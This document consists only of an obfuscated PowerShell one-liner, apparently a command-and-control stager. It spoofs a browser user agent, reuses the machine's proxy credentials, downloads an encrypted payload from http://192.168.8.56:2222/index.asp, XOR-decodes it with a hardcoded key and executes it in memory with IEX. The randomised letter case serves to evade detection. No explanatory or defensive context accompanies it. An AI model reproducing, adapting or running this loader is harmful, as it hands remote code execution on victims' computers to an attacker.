
$WC=NEW-ObJeCT SysTeM.NeT.WEbCLieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDERs.AdD('User-Agent',$u);$wC.PRoXY = [SYstEm.Net.WebReqUeST]::DEFAuLtWEBProXY;$wc.PRoXY.CReDEntIalS = [SYsteM.Net.CReDEntiALCAChE]::DEFAuLtNeTwORkCRedeNtIaLs;$K='c51ce410c124a10e0db5e4b97fc2af39';$i=0;[CHaR[]]$b=([chAR[]]($wC.DownLOaDSTRinG("http://192.168.8.56:2222/index.asp")))|%{$_-BXoR$k[$i++%$k.LENgTh]};IEX ($B-JoIn'')

